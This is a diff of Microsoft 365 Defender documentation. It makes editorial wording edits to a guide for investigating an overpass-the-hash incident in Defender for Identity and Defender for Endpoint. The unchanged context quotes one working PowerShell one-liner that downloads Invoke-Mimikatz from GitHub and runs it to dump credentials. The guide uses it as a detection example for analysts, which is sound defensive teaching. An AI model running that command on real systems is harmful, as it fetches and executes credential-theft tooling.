@@ -30,21 +30,21 @@ ms.technology: m365d
 **Applies to:**
 - Microsoft 365 Defender
 
-Microsoft Defender for Identity can help detect malicious attempts to compromise entities in your organization. Since Defender for Identity integrates with Microsoft 365 Defender, security analysts can have visibility on threats coming in from Defender for Identity, such as suspected Netlogon privilege elevation attempts.
+Microsoft Defender for Identity can help detect malicious attempts to compromise identities in your organization. Because Defender for Identity integrates with Microsoft 365 Defender, security analysts can have visibility on threats coming in from Defender for Identity, such as suspected Netlogon privilege elevation attempts.
 
 ## Investigating the attack in Microsoft Defender for Identity
 
-Microsoft 365 Defender allows analysts to filter alerts by detection source on the alerts tab of the incidents page. In the following example, the detection source is filtered to Defender for Identity. 
+Microsoft 365 Defender allows analysts to filter alerts by detection source on the **Alerts** tab of the incidents page. In the following example, the detection source is filtered to **Defender for Identity**. 
 
 :::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Example of filtering the detection source for Defender for Identity":::
 
-Selecting the **Suspected overpass-the-hash attack** alert brings you to a page in Microsoft Cloud App Security that displays more detailed information. You can always find out more about an alert or attack by selecting **Learn more about this alert type** to read a [description of the attack](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) as well as remediation suggestions.
+Selecting the **Suspected overpass-the-hash attack** alert goes to a page in Microsoft Cloud App Security that displays more detailed information. You can always find out more about an alert or attack by selecting **Learn more about this alert type** to read a [description of the attack](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) as well as remediation suggestions.
  
 :::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Example of a Suspected overpass-the-hash attack alert"::: 
 
 ## Investigating the same attack in Microsoft Defender for Endpoint
 
-Alternatively, an analyst can use Defender for Endpoint to learn more about the activity on an endpoint. Select the incident from the incidents list, then select the Alerts tab. From here, you can identify the detection source as well. A detection source labeled as EDR stands for Endpoint Detection and Response, which is Defender for Endpoint. From here select an alert detected by EDR.
+Alternatively, an analyst can use Defender for Endpoint to learn more about the activity on an endpoint. Select the incident from the incident queue, then select the **Alerts** tab. From here, they can identify the detection source as well. A detection source labeled as EDR stands for Endpoint Detection and Response, which is Defender for Endpoint. From here, the analyst select an alert detected by EDR.
 
 :::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Example of an Endpoint Detection and Response in Defender for Endpoint"::: 
 
@@ -60,7 +60,7 @@ By selecting **See in timeline**, an analyst can drill down even further to dete
 
 Microsoft Defender for Endpoint can detect many malicious files and scripts. However, due to many legitimate uses for outbound connections, PowerShell, and command-line activity, some activity would be considered benign until it creates a malicious file or activity. Therefore, using the timeline helps analysts to put the alert into context with the surrounding activity to determine the original source or time of the attack that otherwise is obscured by common file system and user activity. 
 
-To do this an analyst would start at the time of the alert detection (in red) and scroll down backwards in time to determine when the original activity that led to the malicious activity actually started. 
+To do this, an analyst would start at the time of the alert detection (in red) and scroll down backwards in time to determine when the original activity that led to the malicious activity actually started. 
 
 :::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Example of starting at the time of the alert detection"::: 
 
@@ -72,14 +72,14 @@ In the image below, the analyst filtered to view only network and process events
 
 In this particular event, Notepad was used to make a malicious outbound connection. However, often attackers will simply use iexplorer.exe to establish connections to download a malicious payload because ordinarily iexplorer.exe processes are considered regular web browser activity.
 
-Another item to look for in the timeline would be PowerShell uses for outbound connections. The analyst would look for successful PowerShell connections via commands such as `IEX (New-Object Net.Webclient)` followed by an outbound connection to a website hosting a malicious file. 
+Another item to look for in the timeline would be PowerShell uses for outbound connections. The analyst would look for successful PowerShell connections with commands such as `IEX (New-Object Net.Webclient)` followed by an outbound connection to a website hosting a malicious file. 
 
 In the following example, PowerShell was used to download and execute Mimikatz from a website:
 
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
 ```
-An analyst can quickly search for keywords by typing in the keyword in the search bar to display only events created with Powershell. 
+An analyst can quickly search for keywords by typing in the keyword in the search bar to display only events created with PowerShell. 
 
 ## Next step
 
